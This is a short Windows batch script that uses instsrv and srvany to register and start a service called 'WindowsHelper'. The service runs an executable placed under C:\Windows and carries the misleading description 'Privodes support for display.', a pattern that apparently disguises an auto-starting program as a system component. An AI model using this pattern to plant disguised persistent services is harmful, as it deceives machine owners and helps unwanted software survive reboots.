@echo off
::Program Folder name
set program="WindowsHelper"
::Service Associated Executable File
set EXE="WindowsHelper.exe"
Copy /Y C:\Windows\%program%\instsrv.exe C:\WINDOWS\SysWOW64\instsrv.exe 
Copy /Y C:\Windows\%program%\srvany.exe  C:\WINDOWS\SysWOW64\srvany.exe 
C:\WINDOWS\SysWOW64\instsrv.exe %program% C:\WINDOWS\SysWOW64\srvany.exe 
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\\%program%\Parameters /f
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\\%program%\Parameters /v "Application" /t REG_SZ /d "C:\Windows\\%program%\\%EXE%" /f 
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\\%program%\Parameters /v "AppDirectory" /t REG_SZ /d "C:\Windows\\%program%" /f 
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\\%program%\Parameters /v "AppParameters" /t REG_SZ /f 
sc description %program% "Privodes support for display."
sc start %program%